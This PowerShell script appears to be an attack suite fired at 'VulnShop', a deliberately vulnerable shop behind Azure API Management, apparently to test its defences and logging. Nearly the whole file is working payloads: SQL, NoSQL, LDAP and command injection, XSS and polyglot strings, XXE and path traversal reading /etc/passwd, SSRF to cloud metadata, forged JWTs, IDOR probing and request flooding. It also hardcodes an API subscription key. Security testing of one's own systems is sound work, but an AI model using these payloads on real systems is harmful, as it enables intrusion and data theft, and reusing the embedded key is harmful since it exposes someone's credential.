# advanced-attacks.ps1 - Comprehensive Non-Destructive Attack Suite for VulnShop

param(
    [string]$Target = "apim",
    [switch]$Continuous,
    [int]$Delay = 100  # milliseconds between attacks
)

# Configuration
$APIM_URL = "https://apim-vulnshop-t7up5q.azure-api.net/vulnshop"
$LOCAL_URL = "http://localhost:3001"
$KEY = "8722910157d34e698f969cf34c30eeb5"

# Select target
if ($Target -eq "local") {
    $BASE_URL = $LOCAL_URL
    $headers = @{}
    Write-Host "[TARGET] Local Backend - No API Key Required" -ForegroundColor Yellow
} else {
    $BASE_URL = $APIM_URL
    $headers = @{"Ocp-Apim-Subscription-Key" = $KEY}
    Write-Host "[TARGET] Azure API Management" -ForegroundColor Yellow
}

Write-Host "`n===== ADVANCED SECURITY TESTING SUITE =====" -ForegroundColor Cyan
Write-Host "Non-Destructive Attacks Only" -ForegroundColor Green
Write-Host "==========================================`n" -ForegroundColor Cyan

# Helper functions
Add-Type -AssemblyName System.Web

function Execute-Attack {
    param(
        [string]$Category,
        [string]$Type,
        [string]$Description,
        [string]$Endpoint,
        [string]$Method = "GET",
        [hashtable]$Headers = @{},
        [string]$Body = "",
        [string]$ContentType = "application/json"
    )
    
    Write-Host "[${Category}] $Description" -ForegroundColor Magenta
    Write-Host "  Type: $Type" -ForegroundColor Gray
    Write-Host "  Endpoint: $Endpoint" -ForegroundColor Gray
    
    # Start with global headers (including subscription key)
    $attackHeaders = @{}
    foreach ($key in $script:headers.Keys) {
        $attackHeaders[$key] = $script:headers[$key]
    }
    # Add any additional headers passed to the function
    foreach ($key in $Headers.Keys) {
        $attackHeaders[$key] = $Headers[$key]
    }
    
    if ($Method -ne "GET" -and $ContentType) {
        $attackHeaders["Content-Type"] = $ContentType
    }
    
    try {
        $params = @{
            Uri = "$BASE_URL$Endpoint"
            Method = $Method
            Headers = $attackHeaders
            UseBasicParsing = $true
        }
        
        if ($Body -and $Method -ne "GET") {
            $params["Body"] = $Body
        }
        
        $response = Invoke-WebRequest @params
        
        if ($response.StatusCode -eq 200) {
            Write-Host "  [!] Attack succeeded: HTTP $($response.StatusCode)" -ForegroundColor Red
            Write-Host "  Response size: $($response.Content.Length) bytes" -ForegroundColor Gray
            
            # Check for signs of successful exploitation
            if ($response.Content -match "error|exception|stack|trace" -and $response.Content.Length -lt 5000) {
                Write-Host "  [!] Possible error disclosure detected" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  [+] Response: HTTP $($response.StatusCode)" -ForegroundColor Green
        }
    } catch {
        if ($_.Exception.Response) {
            $status = $_.Exception.Response.StatusCode.value__
            if ($status -eq 403 -or $status -eq 400) {
                Write-Host "  [+] Attack blocked: HTTP $status" -ForegroundColor Green
            } elseif ($status -eq 401) {
                Write-Host "  [*] Auth required: HTTP $status" -ForegroundColor Yellow
            } elseif ($status -eq 429) {
                Write-Host "  [+] Rate limited: HTTP $status" -ForegroundColor Green
            } elseif ($status -eq 500) {
                Write-Host "  [!] Server error: HTTP $status (possible vulnerability)" -ForegroundColor Red
            } else {
                Write-Host "  [-] HTTP $status" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  [x] Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    
    Start-Sleep -Milliseconds $Delay
}

# Encoding helpers
function Encode-Base64($text) { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text)) }
function Encode-Url($text) { [System.Web.HttpUtility]::UrlEncode($text) }
function Encode-Html($text) { [System.Web.HttpUtility]::HtmlEncode($text) }
function Encode-Unicode($text) { 
    $result = ""
    foreach ($char in $text.ToCharArray()) {
        $result += "\u{0:x4}" -f [int]$char
    }
    return $result
}

do {
    $startTime = Get-Date
    $attackCount = 0
    
    Write-Host "`n========== BASIC SQL INJECTION ==========`n" -ForegroundColor Red
    
    # Classic SQL Injection
    Execute-Attack -Category "BASIC" -Type "SQLi" `
        -Description "Classic OR injection" `
        -Endpoint "/api/products?search=$(Encode-Url("' OR '1'='1"))"
    $attackCount++
    
    Execute-Attack -Category "BASIC" -Type "SQLi" `
        -Description "Comment bypass" `
        -Endpoint "/api/products?search=$(Encode-Url("admin'--"))"
    $attackCount++
    
    Execute-Attack -Category "BASIC" -Type "SQLi" `
        -Description "UNION SELECT" `
        -Endpoint "/api/products?search=$(Encode-Url("' UNION SELECT null,null,null--"))"
    $attackCount++
    
    Write-Host "`n========== ADVANCED SQL INJECTION ==========`n" -ForegroundColor Red
    
    # Boolean-based blind SQLi
    Execute-Attack -Category "ADVANCED" -Type "Blind SQLi" `
        -Description "Boolean-based blind" `
        -Endpoint "/api/products?search=$(Encode-Url("' AND '1'='1"))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "Blind SQLi" `
        -Description "Time-based blind (5 sec delay)" `
        -Endpoint "/api/products?search=$(Encode-Url("' AND SLEEP(5)--"))"
    $attackCount++
    
    # Stacked queries
    Execute-Attack -Category "ADVANCED" -Type "SQLi" `
        -Description "Stacked queries (information gathering)" `
        -Endpoint "/api/products?search=$(Encode-Url("'; SELECT sqlite_version();--"))"
    $attackCount++
    
    # Second order SQLi
    Execute-Attack -Category "ADVANCED" -Type "SQLi" `
        -Description "Second order SQLi setup" `
        -Endpoint "/api/register" `
        -Method "POST" `
        -Body '{"username": "admin''--", "password": "test123", "email": "test@test.com"}'
    $attackCount++
    
    Write-Host "`n========== XSS VARIATIONS ==========`n" -ForegroundColor Red
    
    # Basic XSS
    Execute-Attack -Category "BASIC" -Type "XSS" `
        -Description "Simple script tag" `
        -Endpoint "/api/products?search=$(Encode-Url('<script>alert(1)</script>'))"
    $attackCount++
    
    # Advanced XSS
    Execute-Attack -Category "ADVANCED" -Type "XSS" `
        -Description "Event handler XSS" `
        -Endpoint "/api/products?search=$(Encode-Url('<img src=x onerror=alert(1)>'))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "XSS" `
        -Description "SVG XSS" `
        -Endpoint "/api/products?search=$(Encode-Url('<svg onload=alert(1)>'))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "XSS" `
        -Description "Polyglot XSS" `
        -Endpoint "/api/products?search=$(Encode-Url('javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//">'))"
    $attackCount++
    
    # DOM-based XSS attempt
    Execute-Attack -Category "ADVANCED" -Type "XSS" `
        -Description "DOM XSS attempt" `
        -Endpoint "/api/products?search=$(Encode-Url('#<img src=x onerror=alert(1)>'))"
    $attackCount++
    
    Write-Host "`n========== NoSQL INJECTION ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "ADVANCED" -Type "NoSQLi" `
        -Description "MongoDB injection" `
        -Endpoint "/api/login" `
        -Method "POST" `
        -Body '{"username": {"$ne": null}, "password": {"$ne": null}}'
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "NoSQLi" `
        -Description "Regex injection" `
        -Endpoint "/api/login" `
        -Method "POST" `
        -Body '{"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}'
    $attackCount++
    
    Write-Host "`n========== JWT ATTACKS ==========`n" -ForegroundColor Red
    
    # None algorithm
    $noneJWT = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0."
    Execute-Attack -Category "ADVANCED" -Type "JWT" `
        -Description "None algorithm attack" `
        -Endpoint "/api/admin/users" `
        -Headers @{"Authorization" = "Bearer $noneJWT"}
    $attackCount++
    
    # Weak secret
    $weakJWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.4pcPyMD09olPSyXnrXCjTwXyr4BsezdI1AVTmud2fU4"
    Execute-Attack -Category "ADVANCED" -Type "JWT" `
        -Description "Weak secret (123456)" `
        -Endpoint "/api/admin/users" `
        -Headers @{"Authorization" = "Bearer $weakJWT"}
    $attackCount++
    
    Write-Host "`n========== ENCODING BYPASSES ==========`n" -ForegroundColor Red
    
    # URL encoding bypass
    Execute-Attack -Category "ADVANCED" -Type "Encoding" `
        -Description "Double URL encoding" `
        -Endpoint "/api/products?search=%2527%2520OR%2520%25271%2527%253D%25271"
    $attackCount++
    
    # Unicode bypass
    Execute-Attack -Category "ADVANCED" -Type "Encoding" `
        -Description "Unicode encoding" `
        -Endpoint "/api/products?search=%u0027%u0020OR%u0020%u00271%u0027=%u00271"
    $attackCount++
    
    # HTML encoding
    Execute-Attack -Category "ADVANCED" -Type "Encoding" `
        -Description "HTML entity encoding" `
        -Endpoint "/api/products?search=$(Encode-Url('&apos; OR &apos;1&apos;=&apos;1'))"
    $attackCount++
    
    Write-Host "`n========== HEADER INJECTION ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "ADVANCED" -Type "Header" `
        -Description "Host header injection" `
        -Endpoint "/api/products" `
        -Headers @{"Host" = "evil.com"}
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "Header" `
        -Description "X-Forwarded-For injection" `
        -Endpoint "/api/products" `
        -Headers @{"X-Forwarded-For" = "127.0.0.1; cat /etc/passwd"}
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "Header" `
        -Description "User-Agent injection" `
        -Endpoint "/api/products" `
        -Headers @{"User-Agent" = "Mozilla/5.0'; SELECT * FROM users--"}
    $attackCount++
    
    Write-Host "`n========== XXE ATTACKS ==========`n" -ForegroundColor Red
    
    $xxePayload = @'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
    <name>&xxe;</name>
    <price>100</price>
</product>
'@
    
    Execute-Attack -Category "ADVANCED" -Type "XXE" `
        -Description "External entity injection" `
        -Endpoint "/api/products" `
        -Method "POST" `
        -Body $xxePayload `
        -ContentType "application/xml"
    $attackCount++
    
    Write-Host "`n========== LDAP INJECTION ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "ADVANCED" -Type "LDAPi" `
        -Description "LDAP filter bypass" `
        -Endpoint "/api/login" `
        -Method "POST" `
        -Body '{"username": "admin)(&(password=*))", "password": "anything"}'
    $attackCount++
    
    Write-Host "`n========== COMMAND INJECTION ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "BASIC" -Type "CMDi" `
        -Description "Basic command injection" `
        -Endpoint "/api/products?search=$(Encode-Url('; whoami'))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "CMDi" `
        -Description "Pipe command injection" `
        -Endpoint "/api/products?search=$(Encode-Url('| id'))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "CMDi" `
        -Description "Backtick injection" `
        -Endpoint "/api/products?search=$(Encode-Url('`whoami`'))"
    $attackCount++
    
    Write-Host "`n========== PATH TRAVERSAL ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "BASIC" -Type "Path" `
        -Description "Basic path traversal" `
        -Endpoint "/api/products?file=../../../../etc/passwd"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "Path" `
        -Description "Encoded path traversal" `
        -Endpoint "/api/products?file=$(Encode-Url('..%2F..%2F..%2F..%2Fetc%2Fpasswd'))"
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "Path" `
        -Description "Double encoded" `
        -Endpoint "/api/products?file=..%252F..%252F..%252F..%252Fetc%252Fpasswd"
    $attackCount++
    
    Write-Host "`n========== SSRF ATTEMPTS ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "ADVANCED" -Type "SSRF" `
        -Description "Internal network scan" `
        -Endpoint "/api/products" `
        -Method "POST" `
        -Body '{"imageUrl": "http://127.0.0.1:22"}'
    $attackCount++
    
    Execute-Attack -Category "ADVANCED" -Type "SSRF" `
        -Description "Cloud metadata" `
        -Endpoint "/api/products" `
        -Method "POST" `
        -Body '{"imageUrl": "http://169.254.169.254/latest/meta-data/"}'
    $attackCount++
    
    Write-Host "`n========== BUSINESS LOGIC ==========`n" -ForegroundColor Red
    
    Execute-Attack -Category "LOGIC" -Type "Price" `
        -Description "Negative price exploitation" `
        -Endpoint "/api/products" `
        -Method "POST" `
        -Body '{"name": "Test", "price": -100, "description": "Negative price test"}'
    $attackCount++
    
    Execute-Attack -Category "LOGIC" -Type "Quantity" `
        -Description "Integer overflow" `
        -Endpoint "/api/cart" `
        -Method "POST" `
        -Body '{"productId": 1, "quantity": 2147483647}'
    $attackCount++
    
    Execute-Attack -Category "LOGIC" -Type "Race" `
        -Description "Race condition test" `
        -Endpoint "/api/cart" `
        -Method "POST" `
        -Body '{"productId": 1, "quantity": 1}'
    $attackCount++
    
    # Simultaneous race condition (simplified for compatibility)
    Write-Host "  [*] Sending 5 rapid requests for race condition..." -ForegroundColor Cyan
    1..5 | ForEach-Object {
        try {
            Invoke-WebRequest -Uri "$BASE_URL/api/cart" `
                -Method POST `
                -Headers $headers `
                -Body '{"productId": 1, "quantity": 1}' `
                -ContentType "application/json" `
                -UseBasicParsing | Out-Null
        } catch {}
    }
    
    Write-Host "`n========== API FUZZING ==========`n" -ForegroundColor Red
    
    # Method fuzzing
    @("HEAD", "OPTIONS", "TRACE", "PATCH") | ForEach-Object {
        Execute-Attack -Category "FUZZ" -Type "Method" `
            -Description "$_ method test" `
            -Endpoint "/api/products" `
            -Method $_
        $attackCount++
    }
    
    # Content-Type fuzzing
    Execute-Attack -Category "FUZZ" -Type "Content" `
        -Description "Wrong content type" `
        -Endpoint "/api/login" `
        -Method "POST" `
        -Body '{"username": "test", "password": "test"}' `
        -ContentType "text/plain"
    $attackCount++
    
    Write-Host "`n========== IDOR ATTACKS ==========`n" -ForegroundColor Red
    
    1..5 | ForEach-Object {
        Execute-Attack -Category "IDOR" -Type "Direct" `
            -Description "Access order ID $_" `
            -Endpoint "/api/orders/$_"
        $attackCount++
    }
    
    Write-Host "`n========== RATE LIMITING TEST ==========`n" -ForegroundColor Red
    
    Write-Host "Sending 50 rapid requests..." -ForegroundColor Yellow
    $rateLimited = $false
    
    for ($i = 1; $i -le 50; $i++) {
        Write-Progress -Activity "Rate limit test" -Status "$i/50 requests" -PercentComplete (($i/50)*100)
        try {
            $response = Invoke-WebRequest -Uri "$BASE_URL/api/products" `
                -Headers $headers `
                -UseBasicParsing
        } catch {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode.value__ -eq 429) {
                Write-Host "`n[+] Rate limit triggered at request $i!" -ForegroundColor Green
                $rateLimited = $true
                break
            }
        }
    }
    Write-Progress -Activity "Rate limit test" -Completed
    
    if (-not $rateLimited) {
        Write-Host "[!] No rate limiting detected after 50 requests" -ForegroundColor Red
    }
    
    # Summary
    $duration = (Get-Date) - $startTime
    Write-Host "`n========================================" -ForegroundColor Blue
    Write-Host "ATTACK SUMMARY" -ForegroundColor White
    Write-Host "========================================" -ForegroundColor Blue
    Write-Host "Total attacks executed: $attackCount" -ForegroundColor Cyan
    Write-Host "Duration: $($duration.TotalSeconds.ToString('F2')) seconds" -ForegroundColor Cyan
    Write-Host "Average: $([math]::Round($attackCount / $duration.TotalSeconds, 2)) attacks/sec" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Blue
    
    if ($Continuous) {
        Write-Host "`n[*] Waiting 10 seconds before next iteration..." -ForegroundColor Yellow
        Start-Sleep -Seconds 10
    }
    
} while ($Continuous)

Write-Host "`n[COMPLETE] Attack testing finished!" -ForegroundColor Green
Write-Host "[INFO] Check Cortex dashboard for detailed attack logs" -ForegroundColor Cyan
Write-Host "[INFO] Review APIM Analytics for traffic patterns" -ForegroundColor Cyan 